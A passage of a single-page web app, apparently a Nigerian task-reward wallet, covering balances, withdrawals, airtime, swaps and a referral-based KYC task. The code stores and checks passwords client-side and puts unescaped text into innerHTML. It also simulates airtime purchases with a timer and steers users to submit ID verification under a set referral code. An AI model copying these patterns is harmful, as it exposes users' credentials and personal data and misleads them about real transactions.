Rico'},{code:'+974',flag:'🇶🇦',name:'Qatar'},{code:'+262',flag:'🇷🇪',name:'Réunion'},{code:'+40',flag:'🇷🇴',name:'Romania'},{code:'+7',flag:'🇷🇺',name:'Russia'},{code:'+250',flag:'🇷🇼',name:'Rwanda'},{code:'+290',flag:'🇸🇭',name:'Saint Helena'},{code:'+1869',flag:'🇰🇳',name:'Saint Kitts & Nevis'},{code:'+1758',flag:'🇱🇨',name:'Saint Lucia'},{code:'+508',flag:'🇵🇲',name:'Saint Pierre & Miquelon'},{code:'+1784',flag:'🇻🇨',name:'Saint Vincent & Grenadines'},{code:'+685',flag:'🇼🇸',name:'Samoa'},{code:'+378',flag:'🇸🇲',name:'San Marino'},{code:'+239',flag:'🇸🇹',name:'São Tomé & Príncipe'},{code:'+966',flag:'🇸🇦',name:'Saudi Arabia'},{code:'+221',flag:'🇸🇳',name:'Senegal'},{code:'+381',flag:'🇷🇸',name:'Serbia'},{code:'+248',flag:'🇸🇨',name:'Seychelles'},{code:'+232',flag:'🇸🇱',name:'Sierra Leone'},{code:'+65',flag:'🇸🇬',name:'Singapore'},{code:'+1721',flag:'🇸🇽',name:'Sint Maarten'},{code:'+421',flag:'🇸🇰',name:'Slovakia'},{code:'+386',flag:'🇸🇮',name:'Slovenia'},{code:'+677',flag:'🇸🇧',name:'Solomon Islands'},{code:'+252',flag:'🇸🇴',name:'Somalia'},{code:'+27',flag:'🇿🇦',name:'South Africa'},{code:'+82',flag:'🇰🇷',name:'South Korea'},{code:'+211',flag:'🇸🇸',name:'South Sudan'},{code:'+34',flag:'🇪🇸',name:'Spain'},{code:'+94',flag:'🇱🇰',name:'Sri Lanka'},{code:'+249',flag:'🇸🇩',name:'Sudan'},{code:'+597',flag:'🇸🇷',name:'Suriname'},{code:'+47',flag:'🇸🇯',name:'Svalbard & Jan Mayen'},{code:'+46',flag:'🇸🇪',name:'Sweden'},{code:'+41',flag:'🇨🇭',name:'Switzerland'},{code:'+963',flag:'🇸🇾',name:'Syria'},{code:'+886',flag:'🇹🇼',name:'Taiwan'},{code:'+992',flag:'🇹🇯',name:'Tajikistan'},{code:'+255',flag:'🇹🇿',name:'Tanzania'},{code:'+66',flag:'🇹🇭',name:'Thailand'},{code:'+670',flag:'🇹🇱',name:'Timor-Leste'},{code:'+228',flag:'🇹🇬',name:'Togo'},{code:'+690',flag:'🇹🇰',name:'Tokelau'},{code:'+676',flag:'🇹🇴',name:'Tonga'},{code:'+1868',flag:'🇹🇹',name:'Trinidad & Tobago'},{code:'+216',flag:'🇹🇳',name:'Tunisia'},{code:'+90',flag:'🇹🇷',name:'Turkey'},{code:'+993',flag:'🇹🇲',name:'Turkmenistan'},{code:'+1649',flag:'🇹🇨',name:'Turks & Caicos Islands'},{code:'+688',flag:'🇹🇻',name:'Tuvalu'},{code:'+256',flag:'🇺🇬',name:'Uganda'},{code:'+380',flag:'🇺🇦',name:'Ukraine'},{code:'+971',flag:'🇦🇪',name:'United Arab Emirates'},{code:'+44',flag:'🇬🇧',name:'United Kingdom'},{code:'+1',flag:'🇺🇸',name:'United States'},{code:'+598',flag:'🇺🇾',name:'Uruguay'},{code:'+998',flag:'🇺🇿',name:'Uzbekistan'},{code:'+678',flag:'🇻🇺',name:'Vanuatu'},{code:'+39',flag:'🇻🇦',name:'Vatican City'},{code:'+58',flag:'🇻🇪',name:'Venezuela'},{code:'+84',flag:'🇻🇳',name:'Vietnam'},{code:'+1340',flag:'🇻🇮',name:'Virgin Islands (US)'},{code:'+681',flag:'🇼🇫',name:'Wallis & Futuna'},{code:'+967',flag:'🇾🇪',name:'Yemen'},{code:'+260',flag:'🇿🇲',name:'Zambia'},{code:'+263',flag:'🇿🇼',name:'Zimbabwe'}
        ];

        function showCountryDropdown() {
            filterCountryCodes(document.getElementById('signup-code').value);
            document.getElementById('country-dropdown').classList.remove('hidden');
            // Close when clicking outside
            setTimeout(() => {
                document.addEventListener('click', hideCountryDropdownOutside, { once: true });
            }, 10);
        }

        function hideCountryDropdownOutside(e) {
            const dd = document.getElementById('country-dropdown');
            const inp = document.getElementById('signup-code');
            if (dd && !dd.contains(e.target) && e.target !== inp) {
                dd.classList.add('hidden');
            }
        }

        function filterCountryCodes(q) {
            const dd = document.getElementById('country-dropdown');
            const term = (q || '').toLowerCase().replace('+', '');
            const matches = ALL_COUNTRIES.filter(c =>
                c.name.toLowerCase().includes(term) ||
                c.code.replace('+','').includes(term) ||
                c.flag.includes(q)
            ).slice(0, 80);
            if (!matches.length) { dd.classList.add('hidden'); return; }
            dd.classList.remove('hidden');
            dd.innerHTML = matches.map(c => `
                <div onclick="selectCountryCode('${c.code}','${c.name}')"
                    style="display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;font-size:12px;border-bottom:1px solid #f1f5f9;transition:background 0.15s;"
                    onmouseover="this.style.background='#fff7ed'" onmouseout="this.style.background=''">
                    <span style="font-size:18px;">${c.flag}</span>
                    <span style="flex:1;font-weight:600;color:#1e293b;">${c.name}</span>
                    <span style="font-weight:800;color:#f97316;">${c.code}</span>
                </div>`).join('');
        }

        function selectCountryCode(code, name) {
            document.getElementById('signup-code').value = code;
            document.getElementById('country-dropdown').classList.add('hidden');
            document.getElementById('signup-phone').focus();
        }

        function getCountryFromCode(code) {
            const c = ALL_COUNTRIES.find(x => x.code === code);
            return c ? c.name : 'Unknown';
        }

        function launchApp() {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('main-app').classList.remove('hidden');
            updateBalanceUI();
            updateHistoryUI();
            startInactivityWatcher();
        }

        // ── Poll for task/rate updates from jsonbin cache ──
        let lastTaskCount = -1;
        let lastRate = 0;
        let lastHistoryLength = -1;
        function pollDashboardUpdates() {
            const db = loadAdminDB();
            if (!db) return;

            // New task published
            const taskCount = (db.tasks || []).filter(t => t.status === 'active').length;
            if (lastTaskCount === -1) {
                lastTaskCount = taskCount;
            } else if (taskCount > lastTaskCount) {
                lastTaskCount = taskCount;
                    const newest = (db.tasks||[]).filter(t=>t.status==='active').slice(-1)[0];
                if (newest) {
                    userData.history.unshift({
                        title: `New Task: ${newest.title}`,
                        amount: newest.reward, type: 'notif',
                        date: new Date().toLocaleString('en-NG',{day:'numeric',month:'short',hour:'2-digit',minute:'2-digit'})
                    });
                    saveToPhone();
                    updateHistoryUI();
                    const dot = document.getElementById('notif-dot');
                    if (dot) dot.classList.remove('hidden');
                }
            } else if (taskCount !== lastTaskCount) {
                lastTaskCount = taskCount;
                }

            // Rate changed
            const rate = db.usd_rate || 1500;
            if (rate !== lastRate) { lastRate = rate; updateBalanceUI(); }

            // Check if admin deposited a reward into this user's account
            if (!userData.uid || !db.users) return;
            const dbUser = db.users.find(u => u.uid === userData.uid);
            if (!dbUser) return;
            const dbHist = dbUser.history || [];
            if (lastHistoryLength === -1) { lastHistoryLength = dbHist.length; return; }
            if (dbHist.length > lastHistoryLength) {
                // Admin added entries — pull latest balances
                userData.wallet_balance = dbUser.wallet_balance || 0;
                userData.usdt_balance = dbUser.usdt_balance || 0;
                userData.redemption_balance = dbUser.redemption_balance || 0;
                userData.history = dbHist;
                lastHistoryLength = dbHist.length;
                localStorage.setItem('capacity_hub_core_data', JSON.stringify(userData));
                updateBalanceUI();
                updateHistoryUI();
                const dot = document.getElementById('notif-dot');
                if (dot) dot.classList.remove('hidden');
            }
        }

        function updateBalanceUI() {
            if (!userData) return;
            const usdtVal = userData.usdt_balance !== undefined ? userData.usdt_balance : 0.00;
            const ngnVal = userData.wallet_balance !== undefined ? userData.wallet_balance : 0;
            const cphVal = userData.redemption_balance !== undefined ? userData.redemption_balance : 0;

            document.getElementById('balance-usdt').innerText = usdtVal.toFixed(2);
            document.getElementById('balance-usdt-fiat').innerText = `≈ ${usdtVal.toFixed(2)} USD`;
            document.getElementById('balance-naira').innerText = `₦${ngnVal.toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
            const RATE = getRate();
            const ngnInUsd = ngnVal / RATE;
            document.getElementById('balance-naira-fiat').innerText = `≈ ${ngnInUsd.toFixed(2)} USD`;
            document.getElementById('balance-cph').innerText = cphVal.toLocaleString('en-NG', {minimumFractionDigits: 2});
            const cphInUsd = cphVal / RATE;
            document.getElementById('balance-cph-fiat').innerText = `≈ ${cphInUsd.toFixed(2)} USD`;

            const aggregateNgn = ngnVal + (usdtVal * RATE) + cphVal;
            const aggregateUsd = usdtVal + ngnInUsd + cphInUsd;
            document.getElementById('total-portfolio-value').innerText = `₦${aggregateNgn.toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
            document.getElementById('total-portfolio-value-usd').innerText = `≈ ${aggregateUsd.toFixed(2)} USD`;

            const uidBadge = document.getElementById('user-uid-display');
            if (uidBadge) uidBadge.innerText = userData.uid;

            // Topbar mini balances
            const navNGN = document.getElementById('nav-balance-ngn');
            const navUSDT = document.getElementById('nav-balance-usdt');
            if (navNGN) navNGN.innerText = `₦${ngnVal.toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
            if (navUSDT) navUSDT.innerText = `${usdtVal.toFixed(2)} USDT`;

            // Profile section
            const profNGN = document.getElementById('profile-ngn');
            const profUSDT = document.getElementById('profile-usdt');
            const profName = document.getElementById('profile-name');
            const profUID = document.getElementById('profile-uid');
            const profAvatar = document.getElementById('profile-avatar');
            if (profNGN) profNGN.innerText = `₦${ngnVal.toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
            if (profUSDT) profUSDT.innerText = `${usdtVal.toFixed(2)} USDT`;
            if (profName) profName.innerText = userData.name || 'App User';
            if (profUID) profUID.innerText = `UID: ${userData.uid || '—'}`;
            if (profAvatar) profAvatar.innerText = (userData.name || 'U')[0].toUpperCase();

            // Task progress
            renderTaskProgress();
        }

        function addTransaction(title, amount, type) {
            const entry = {
                title,
                amount,
                type,
                date: new Date().toLocaleString('en-NG', { day: 'numeric', month: 'short', hour: '2-digit', minute: '2-digit' })
            };
            userData.history.unshift(entry);
            saveToPhone(); // saveToPhone now also calls syncUserToAdminDB
            updateHistoryUI();
            document.getElementById('notif-dot').classList.remove('hidden');
        }

        function updateHistoryUI() {
            const list = document.getElementById('history-list');
            if (userData.history.length === 0) {
                list.innerHTML = '<div class="text-center py-10 text-slate-400 text-[10px] font-bold uppercase tracking-widest">No Transactions Yet</div>';
                return;
            }
            list.innerHTML = userData.history.map(item => {
                if (item.type === 'notif') {
                    return `<div class="history-item">
                        <div class="flex flex-col">
                            <span class="text-[11px] font-bold text-slate-800">${item.title}</span>
                            <span class="text-[9px] text-slate-400">${item.date}</span>
                        </div>
                        <span class="text-[11px] font-black text-orange-500">₦${Number(item.amount).toLocaleString()} reward</span>
                    </div>`;
                }
                return `<div class="history-item">
                    <div class="flex flex-col">
                        <span class="text-[11px] font-bold text-slate-800">${item.title}</span>
                        <span class="text-[9px] text-slate-400">${item.date}</span>
                    </div>
                    <span class="text-[11px] font-black ${item.type === 'plus' ? 'text-green-500' : 'text-red-500'}">
                        ${item.type === 'plus' ? '+' : '-'} ₦${Number(item.amount).toLocaleString()}
                    </span>
                </div>`;
            }).join('');
        }

        function toggleHistory() {
            const modal = document.getElementById('history-modal');
            const isClosing = !modal.classList.contains('opacity-0');
            if (isClosing) {
                modal.classList.add('opacity-0', 'pointer-events-none');
                modal.children[0].classList.add('scale-90');
            } else {
                modal.classList.remove('opacity-0', 'pointer-events-none');
                modal.children[0].classList.remove('scale-90');
                document.getElementById('notif-dot').classList.add('hidden');
            }
        }

        function openAirtimeModal() {
            const modal = document.getElementById('airtime-modal');
            document.getElementById('airtime-form').classList.remove('hidden');
            document.getElementById('airtime-processing').classList.add('hidden');
            document.getElementById('airtime-success').classList.add('hidden');
            document.getElementById('a-phone').value = '';
            document.getElementById('a-amount').value = '';
            document.getElementById('a-network').selectedIndex = 0;
            document.getElementById('a-pin').value = '';
            modal.classList.remove('opacity-0', 'pointer-events-none');
            modal.children[0].classList.remove('scale-90');
        }

        function closeAirtimeModal() {
            const modal = document.getElementById('airtime-modal');
            modal.classList.add('opacity-0', 'pointer-events-none');
            modal.children[0].classList.add('scale-90');
        }

        function processAirtime() {
            const phone = document.getElementById('a-phone').value;
            const network = document.getElementById('a-network').value;
            const amount = parseFloat(document.getElementById('a-amount').value);
            const pin = document.getElementById('a-pin').value;
            if (!phone || !network || !amount || !pin) { showAction('Error', 'Please fill all fields to continue.'); return; }
            if (userData.wallet_balance < amount) { showAction('Failed', 'Insufficient wallet balance.'); return; }
            document.getElementById('airtime-form').classList.add('hidden');
            document.getElementById('airtime-processing').classList.remove('hidden');
            setTimeout(() => {
                userData.wallet_balance -= amount;
                addTransaction(`Airtime (${network})`, amount, 'minus');
                updateBalanceUI();
                document.getElementById('airtime-processing').classList.add('hidden');
                document.getElementById('airtime-success').classList.remove('hidden');
            }, 3000);
        }

        function handleInstallApp() {
            switchTab('offers');
        }

        function handleSimpleTask() {
            switchTab('offers');
        }

        function openTaskDetails(taskId) {
            const modal = document.getElementById('task-details-modal');
            const titleEl = document.getElementById('task-title-main');
            const descEl = document.getElementById('task-desc-main');
            const warnBox = document.getElementById('task-warning-box');
            const warnText = document.getElementById('task-warning-text');
            const actionBtn = document.getElementById('task-action-btn');
            const refBox = document.getElementById('referral-code-box');
            const iconEl = document.getElementById('task-icon-main');
            if (taskId === 'metapass') {
                titleEl.innerText = "Meta Earth Task";
                iconEl.className = "fas fa-earth-africa";
                descEl.innerText = "Meta earth is a wallet that is giving new users who registered, do face verification and advanced kyc (1 MEC) $8. But they will stake it for you!.";
                warnText.innerText = "The national ID card must be plastic/small one, if you didn't use this invitation code/referral code you won't get that N500 naira \"y92x8cjd\". Take a screenshot after your kyc is approved and send to the admin he will give you PROMO CODE to apply in your redemption and get your 500 naira instantly and also $8 in your account.";
                warnBox.classList.remove('hidden');
                refBox.classList.remove('hidden');
                actionBtn.onclick = () => window.open('https://play.google.com/store/apps/details?id=com.xd.metapass', '_blank');
            }
            modal.classList.remove('opacity-0', 'pointer-events-none');
            modal.children[0].classList.remove('scale-90');
        }

        function closeTaskDetails() {
            const modal = document.getElementById('task-details-modal');
            modal.classList.add('opacity-0', 'pointer-events-none');
            modal.children[0].classList.add('scale-90');
        }

        function copyRefCode() {
            const code = document.getElementById('ref-code-value').innerText;
            const tempInput = document.createElement("input");
            tempInput.value = code;
            document.body.appendChild(tempInput);
            tempInput.select();
            document.execCommand("copy");
            document.body.removeChild(tempInput);
            const copyBtn = event.target;
            const originalText = copyBtn.innerText;
            copyBtn.innerText = "COPIED!";
            setTimeout(() => copyBtn.innerText = originalText, 1500);
        }

        function switchTab(tabId) {
            const views = ['dashboard', 'offers', 'assets', 'profile'];
            views.forEach(v => {
                const viewEl = document.getElementById('view-' + v);
                const navEl = document.getElementById('nav-' + v);
                if(viewEl) viewEl.classList.add('hidden');
                if(navEl) navEl.classList.replace('text-orange-500', 'text-slate-400');
            });
            if (tabId === 'offers') {
                }
            document.getElementById('view-' + tabId).classList.remove('hidden');
            document.getElementById('nav-' + tabId).classList.replace('text-slate-400', 'text-orange-500');
            if (tabId === 'profile') { updateBalanceUI(); }
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function showAction(type, msg) {
            const modal = document.getElementById('modal-container');
            document.getElementById('modal-title').innerText = type;
            document.getElementById('modal-body').innerText = msg;
            document.getElementById('modal-icon').innerHTML = '<i class="fas fa-bell"></i>';
            modal.classList.remove('opacity-0', 'pointer-events-none');
            document.getElementById('modal-content').classList.remove('scale-90');
        }

        function closeModal() {
            document.getElementById('modal-container').classList.add('opacity-0', 'pointer-events-none');
            document.getElementById('modal-content').classList.add('scale-90');
        }

        function openSupportModal() {
            document.getElementById('support-modal').classList.remove('opacity-0', 'pointer-events-none');
        }

        function closeSupportModal() {
            document.getElementById('support-modal').classList.add('opacity-0', 'pointer-events-none');
        }

        function openWithdrawalModal(walletName) {
            document.getElementById('withdraw-title').innerText = walletName;
            document.getElementById('withdraw-fields').classList.remove('hidden');
            document.getElementById('withdraw-step2').classList.add('hidden');
            document.getElementById('withdraw-processing').classList.add('hidden');
            document.getElementById('withdraw-success').classList.add('hidden');

            const isUSDT = walletName.includes('USDT') || walletName.includes('Tether');
            const isNGN = walletName.includes('NGN') || walletName.includes('Naira');

            document.getElementById('w-network-row').classList.toggle('hidden', !isUSDT);
            document.getElementById('w-usdt-address-row').classList.toggle('hidden', !isUSDT);
            document.getElementById('w-bank-fields').classList.toggle('hidden', isUSDT);
            document.getElementById('w-pin').classList.toggle('hidden', isUSDT || isNGN);
            document.getElementById('w-proceed-btn').classList.toggle('hidden', !isUSDT);
            document.getElementById('w-ngn-proceed-btn').classList.toggle('hidden', !isNGN);
            document.getElementById('w-withdraw-btn').classList.toggle('hidden', isUSDT || isNGN);

            document.getElementById('w-amount').value = '';
            document.getElementById('w-pin').value = '';
            if (document.getElementById('w-wallet-address')) document.getElementById('w-wallet-address').value = '';
            if (document.getElementById('w-login-password')) document.getElementById('w-login-password').value = '';
            document.getElementById('w-acc-num').value = '';
            document.getElementById('w-acc-name').value = '';
            document.getElementById('w-bank-name').value = '';

            document.getElementById('withdraw-modal').classList.remove('opacity-0', 'pointer-events-none');
        }

        function proceedNGN() {
            const accNum = document.getElementById('w-acc-num').value.trim();
            const accName = document.getElementById('w-acc-name').value.trim();
            const bankName = document.getElementById('w-bank-name').value.trim();
            const amount = parseFloat(document.getElementById('w-amount').value);
            if (!accNum || !accName || !bankName) { showAction('Error', 'Please fill in all account details.'); return; }
            if (!amount || amount <= 0) { showAction('Error', 'Please enter a valid amount.'); return; }
            if (userData.wallet_balance < amount) { showAction('Failed', 'Insufficient funds in this asset wallet.'); return; }
            document.getElementById('withdraw-fields').classList.add('hidden');
            document.getElementById('withdraw-step2').classList.remove('hidden');
        }

        function proceedUSDT() {
            const address = document.getElementById('w-wallet-address').value.trim();
            const amount = parseFloat(document.getElementById('w-amount').value);
            if (!address) { showAction('Error', 'Please enter your wallet address.'); return; }
            if (!amount || amount < 0.5) { showAction('Failed', 'Minimum withdrawal for USDT is 0.5.'); return; }
            if (userData.usdt_balance < amount) { showAction('Failed', 'Insufficient funds in this asset wallet.'); return; }
            document.getElementById('withdraw-fields').classList.add('hidden');
            document.getElementById('withdraw-step2').classList.remove('hidden');
        }

        async function processWithdrawal() {
            const amountInput = document.getElementById('w-amount');
            const amount = parseFloat(amountInput.value);
            const title = document.getElementById('withdraw-title').innerText;
            const isUSDT = title.includes('USDT') || title.includes('Tether');
            const isNGN  = title.includes('NGN')  || title.includes('Naira');
            let targetField = 'wallet_balance';
            if (isUSDT) targetField = 'usdt_balance';
            else if (title.includes('CPH')) targetField = 'redemption_balance';
            else targetField = 'wallet_balance';

            if (targetField === 'usdt_balance' || targetField === 'wallet_balance') {
                const loginPass = document.getElementById('w-login-password').value;
                if (!loginPass) { showAction('Error', 'Please enter your login password.'); return; }
                // Validate password matches
                if (loginPass !== userData.password) { showAction('Error', 'Login password is incorrect.'); return; }

                document.getElementById('withdraw-step2').classList.add('hidden');
                document.getElementById('withdraw-processing').classList.remove('hidden');

                setTimeout(async () => {
                    // Build withdrawal request
                    const wd = {
                        id: Math.random().toString(36).substr(2, 9),
                        userId: userData.uid,
                        userName: userData.name || 'User',
                        userPhone: userData.phone || '',
                        type: isUSDT ? 'USDT' : 'NGN',
                        amount: amount,
                        accNum: isUSDT ? null : document.getElementById('w-acc-num').value.trim(),
                        accName: isUSDT ? null : document.getElementById('w-acc-name').value.trim(),
                        bankName: isUSDT ? null : document.getElementById('w-bank-name').value.trim(),
                        network: isUSDT ? 'BEP20 (Binance Smart Chain)' : null,
                        walletAddress: isUSDT ? document.getElementById('w-wallet-address').value.trim() : null,
                        status: 'pending',
                        date: new Date().toLocaleString('en-NG', { day:'numeric', month:'short', hour:'2-digit', minute:'2-digit' })
                    };

                    // Deduct balance
                    userData[targetField] -= amount;
                    addTransaction(`Withdrawal Pending (${title})`, amount, 'minus');
                    updateBalanceUI();

                    // Save to jsonbin
                    await sbSaveWithdrawal(wd);
                    // Also update local cache
                    const db2 = loadAdminDB() || { withdrawals: [] };
                    if (!db2.withdrawals) db2.withdrawals = [];
                    db2.withdrawals.unshift(wd);
                    saveAdminDB(db2);

                    document.getElementById('withdraw-processing').classList.add('hidden');
                    document.getElementById('withdraw-success').classList.remove('hidden');
                    amountInput.value = '';
                }, 3000);
                return;
            }

            if (!amount || amount <= 0) return;
            if (userData[targetField] < amount) { showAction('Failed', 'Insufficient funds in this asset wallet.'); return; }
            document.getElementById('withdraw-fields').classList.add('hidden');
            document.getElementById('withdraw-processing').classList.remove('hidden');
            setTimeout(() => {
                userData[targetField] -= amount;
                addTransaction(`Withdrawal Pending (${title})`, amount, 'minus');
                updateBalanceUI();
                document.getElementById('withdraw-processing').classList.add('hidden');
                document.getElementById('withdraw-success').classList.remove('hidden');
                amountInput.value = '';
            }, 2500);
        }

        function closeWithdrawModal() {
            document.getElementById('withdraw-modal').classList.add('opacity-0', 'pointer-events-none');
        }

        function applyRedemption() {
            showAction('Invalid', 'This redemption code is not active.');
        }

        function openSwapModal() {
            document.getElementById('swap-form').classList.remove('hidden');
            document.getElementById('swap-processing').classList.add('hidden');
            document.getElementById('swap-success').classList.add('hidden');
            document.getElementById('swap-amount').value = '';
            document.getElementById('swap-preview').innerText = 'You will receive: —';
            setSwapDirection('usdt-ngn');
            document.getElementById('swap-modal').classList.remove('opacity-0', 'pointer-events-none');
            document.getElementById('swap-modal').children[0].classList.remove('scale-90');
        }

        function closeSwapModal() {
            document.getElementById('swap-modal').classList.add('opacity-0', 'pointer-events-none');
            document.getElementById('swap-modal').children[0].classList.add('scale-90');
        }

        let swapDirection = 'usdt-ngn';

        function setSwapDirection(dir) {
            swapDirection = dir;
            const RATE = getRate();
            const usdtBtn = document.getElementById('swap-btn-usdt-ngn');
            const ngnBtn = document.getElementById('swap-btn-ngn-usdt');
            if (dir === 'usdt-ngn') {
                usdtBtn.classList.add('bg-orange-500', 'text-white');
                usdtBtn.classList.remove('bg-white', 'text-orange-500');
                ngnBtn.classList.add('bg-white', 'text-orange-500');
                ngnBtn.classList.remove('bg-orange-500', 'text-white');
                document.getElementById('swap-rate-label').innerText = `Rate: 1 USDT = ₦${RATE.toLocaleString()}`;
            } else {
                ngnBtn.classList.add('bg-orange-500', 'text-white');
                ngnBtn.classList.remove('bg-white', 'text-orange-500');
                usdtBtn.classList.add('bg-white', 'text-orange-500');
                usdtBtn.classList.remove('bg-orange-500', 'text-white');
                document.getElementById('swap-rate-label').innerText = `Rate: ₦${RATE.toLocaleString()} = 1 USDT`;
            }
            updateSwapPreview();
        }

        function updateSwapPreview() {
            const amount = parseFloat(document.getElementById('swap-amount').value);
            const preview = document.getElementById('swap-preview');
            const RATE = getRate();
            if (!amount || amount <= 0) { preview.innerText = 'You will receive: —'; return; }
            if (swapDirection === 'usdt-ngn') {
                preview.innerText = `You will receive: ₦${(amount * RATE).toLocaleString('en-NG', {minimumFractionDigits: 2})}`;
            } else {
                preview.innerText = `You will receive: ${(amount / RATE).toFixed(4)} USDT`;
            }
        }

        function processSwap() {
            const amount = parseFloat(document.getElementById('swap-amount').value);
            const RATE = getRate();
            if (!amount || amount <= 0) { showAction('Error', 'Please enter a valid amount.'); return; }
            if (swapDirection === 'usdt-ngn') {
                if (userData.usdt_balance < amount) { showAction('Failed', 'Insufficient USDT balance.'); return; }
                const ngnReceived = amount * RATE;
                document.getElementById('swap-form').classList.add('hidden');
                document.getElementById('swap-processing').classList.remove('hidden');
                setTimeout(() => {
                    userData.usdt_balance -= amount;
                    userData.wallet_balance += ngnReceived;
                    addTransaction(`Swap ${amount} USDT → NGN`, ngnReceived, 'plus');
                    updateBalanceUI();
                    document.getElementById('swap-processing').classList.add('hidden');
                    document.getElementById('swap-success').classList.remove('hidden');
                }, 3000);
            } else {
                if (userData.wallet_balance < amount) { showAction('Failed', 'Insufficient NGN balance.'); return; }
                const usdtReceived = amount / RATE;
                document.getElementById('swap-form').classList.add('hidden');
                document.getElementById('swap-processing').classList.remove('hidden');
                setTimeout(() => {
                    userData.wallet_balance -= amount;
                    userData.usdt_balance += usdtReceived;
                    addTransaction(`Swap ₦${amount.toLocaleString()} NGN → USDT`, usdtReceived, 'plus');
                    updateBalanceUI();
                    document.getElementById('swap-processing').classList.add('hidden');
                    document.getElementById('swap-success').classList.remove('hidden');
                }, 3000);
            }
        }

        function renderTaskProgress() {
            const el = document.getElementById('profile-task-progress');
            if (!el) return;
            const db = loadAdminDB();
            if (!db || !db.submissions) { return; }
            const mySubs = db.submissions.filter(s => s.userId === userData.uid || s.userId === userData.phone);
            if (!mySubs.length) {
                el.innerHTML = '<div class="text-center py-4"><p class="text-[10px] text-slate-400 font-bold">No task submissions yet.</p></div>';
                return;
            }
            el.innerHTML = mySubs.map(s => {
                const task = db.tasks?.find(t => t.id === s.taskId);
                const statusColor = s.status === 'approved' ? 'text-green-500' : s.status === 'declined' ? 'text-red-500' : 'text-orange-500';
                const statusIcon = s.status === 'approved' ? 'fa-check-circle' : s.status === 'declined' ? 'fa-times-circle' : 'fa-clock';
                const statusLabel = s.status === 'approved' ? 'Approved' : s.status === 'declined' ? 'Declined' : 'Pending Review';
                return `<div class="flex items-center justify-between py-2.5 border-b border-slate-100 last:border-0">
                    <div class="flex-1">
                        <p class="text-[11px] font-bold text-slate-800">${task?.title || 'Unknown Task'}</p>
                        <p class="text-[9px] text-slate-400 mt-0.5">${s.date} · ₦${Number(task?.reward || 0).toLocaleString()}</p>
                    </div>
                    <span class="text-[10px] font-black ${statusColor} flex items-center gap-1">
                        <i class="fas ${statusIcon}"></i> ${statusLabel}
                    </span>
                </div>`;
            }).join('');
        }



        // ── LOG OUT ──
        function logOut() {
            userData.loggedIn = false;
            localStorage.setItem('capacity_hub_core_data', JSON.stringify(userData));
            // Hide main app, show auth screen
            document.getElementById('main-app').classList.add('hidden');
            document.getElementById('auth-screen').classList.remove('hidden');
            // Reset auth inputs
            ['login-name','login-password','signup-name','signup-phone',
             'signup-password','signup-referral','signup-code'].forEach(id => {
                const el = document.getElementById(id);
                if (el) el.value = '';
            });
            document.getElementById('login-error')?.classList.add('hidden');
            document.getElementById('signup-error')?.classList.add('hidden');
            showAuthTab('login');
            clearInactivityTimer();
        }

        // ── 5-MINUTE INACTIVITY AUTO-LOGOUT ──
        let inactivityTimer = null;

        function resetInactivityTimer() {
            clearInactivityTimer();
            // Only run timer if user is logged in and app is visible
            const el = document.getElementById('main-app');
            if (!el || el.classList.contains('hidden')) return;
            inactivityTimer = setTimeout(() => {
                logOut();
                // Show a subtle message on the login form
                const errEl = document.getElementById('login-error');
                if (errEl) {
                    errEl.textContent = 'You were logged out after 5 minutes of inactivity.';
                    errEl.classList.remove('hidden');
                }
            }, INACTIVITY_MS);
        }

        function clearInactivityTimer() {
            if (inactivityTimer) { clearTimeout(inactivityTimer); inactivityTimer = null; }
        }

        function startInactivityWatcher() {
            ['touchstart','touchmove','click','keydown','scroll','mousemove'].forEach(evt => {
                document.addEventListener(evt, resetInactivityTimer, { passive: true });
            });
            // Also watch when user returns to the tab/app
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible') {
                    resetInactivityTimer();
                } else {
                    // Record time user left
                    localStorage.setItem('ch_left_at', Date.now().toString());
                }
            });
            resetInactivityTimer();
        }

        function goToSupport() {
            switchTab('profile');
            setTimeout(() => openSupportModal(), 200);
        }
    </script>
    <!-- Task Submission Modal -->
    <div id="task-submit-modal" class="fixed inset-0 z-[120] flex items-end justify-center bg-black/50 opacity-0 pointer-events-none transition-opacity duration-300">
        <div class="bg-white w-full max-w-sm rounded-t-3xl p-5 transform translate-y-full transition-transform duration-300" id="task-submit-sheet">

            <!-- Header -->
            <div class="flex items-center justify-between mb-4">
                <div>
                    <h3 class="text-sm font-black text-slate-800 uppercase tracking-tight">Submit Task Proof</h3>
                    <p class="text-[10px] text-slate-400 font-bold mt-0.5" id="task-submit-subtitle">Task Name</p>
                </div>
                <button onclick="closeTaskSubmit()" class="w-7 h-7 bg-slate-100 rounded-full flex items-center justify-center">
                    <i class="fas fa-times text-slate-500" style="font-size:10px;"></i>
                </button>
            </div>

            <!-- Task name (auto-filled, readonly) -->
            <div class="flex flex-col gap-1 mb-3">
                <label class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Task Name</label>
                <input id="ts-task-name" type="text" readonly
                    class="auth-input bg-slate-50 text-slate-400 cursor-not-allowed text-xs">
            </div>

            <!-- Task Description -->
            <div class="flex flex-col gap-1 mb-3">
                <label class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Task Description <span class="text-orange-400 normal-case">(What you did)</span></label>
                <textarea id="ts-description" rows="3" placeholder="Describe what you did to complete this task..."
                    class="auth-input resize-none text-xs" style="padding:8px 10px;"></textarea>
            </div>

            <!-- Screenshot Upload -->
            <div class="flex flex-col gap-1 mb-4">
                <label class="text-[9px] font-black text-slate-500 uppercase tracking-widest">Screenshot Proof</label>
                <label for="ts-screenshot" class="flex flex-col items-center justify-center gap-2 p-4 bg-slate-50 border-2 border-dashed border-slate-200 rounded-xl cursor-pointer active:bg-orange-50 active:border-orange-300 transition-colors" id="ts-upload-label">
                    <i class="fas fa-cloud-upload-alt text-slate-300 text-xl"></i>
                    <span class="text-[10px] font-bold text-slate-400">Tap to upload screenshot</span>
                    <span class="text-[9px] text-slate-300">JPG, PNG supported</span>
                </label>
                <input type="file" id="ts-screenshot" accept="image/*" class="hidden" onchange="previewTaskScreenshot(this)">
                <img id="ts-preview" src="" alt="Preview" class="hidden w-full rounded-xl mt-2 border border-slate-100" style="max-height:140px;object-fit:cover;">
            </div>

            <!-- Error -->
